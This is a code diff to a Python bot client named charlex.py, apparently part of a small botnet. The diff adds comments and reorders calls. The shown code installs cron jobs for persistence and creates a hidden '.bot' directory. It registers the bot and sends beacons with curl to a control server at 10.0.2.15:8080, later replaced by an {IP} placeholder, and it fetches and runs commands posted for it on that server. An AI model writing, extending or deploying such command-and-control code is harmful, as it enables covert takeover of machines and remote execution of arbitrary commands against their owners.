@@ -6,7 +6,8 @@ import requests
 from datetime import datetime
 import time
 
-# 
+# Cronjob functions that set up bot to run automatically each day and periodically beacon for instructions.
+##whoami variable ensures that the program will always know where it is  
 def cronjobs():
 	whoami = os.getcwd()+"/charlex.py"
 	start = '(crontab -l 2>/dev/null; echo "0 12 * * * '+whoami+'  >/dev/null >/dev/null 2>&1") | crontab -'
@@ -15,6 +16,8 @@ def cronjobs():
 	os.system(start)
 	os.system(beacon)
 	os.system(instructions)
+#this creates hidden directory '.bot' in the working directory of the program.  
+## in .bot, it creates a file called name.txt
 def directoryhandler():
 	dir = os.path.join('./','.bot')
 	if not os.path.exists(dir):
@@ -23,9 +26,11 @@ def directoryhandler():
 		f = open('name.txt', 'w+')
 		f.write('')
 		f.close()
-	else:
-		os.chdir(dir)
+#namecheck reads the roster of bots and checks to see if it is listed.  
+#if it is not listed, it names itself and sends its name to the server
 def namecheck():
+	dir = os.path.join('./','.bot')
+	os.chdir(dir)
 	botnames = requests.get('http://10.0.2.15:8080/botnames.txt')
 	data = botnames.text.strip().split()
 	lastbot = data[-1]
@@ -33,10 +38,11 @@ def namecheck():
 		if f not in data:
 			myname = str(int(lastbot)+1)
 			f.write(myname)
-			request = 'curl -d '+myname+' http://10.0.2.15:8080/log.txt'
+			request = 'curl -d '+myname+' {IP}:8080/botnames.txt'
 			os.system(request)
 		else:
 			close()
+#this is a beacon that runs as a cronjob and sends the current time "Online" and the name of the bot
 def beacon():
 	dir = os.path.join('./','.bot')
 	os.chdir(dir)
@@ -44,9 +50,9 @@ def beacon():
 	x = datetime.now()
 	current_time = x.strftime("%H:%M:%S")
 	data = current_time+' Online '+myname.read()
-	request = 'curl -d "'+data+'" http://10.0.2.15:8080/log.txt'
+	request = 'curl -d "'+data+'" http://{IP}:8080/log.txt'
 	os.system(request)
-
+#this checks the instructions page on the server and does the commands labeled with its name that it sees
 def instructions():
 	dir = os.path.join('./','.bot')
 	os.chdir(dir)
@@ -69,9 +75,9 @@ def instructions():
 
 if __name__ == '__main__':
 	if len(sys.argv) == 1:
+		cronjobs()
 		directoryhandler()
 		namecheck()
-		cronjobs()
 	elif sys.argv[1] == 'beacon':
 		beacon()
 	elif sys.argv[1] == 'instructions':
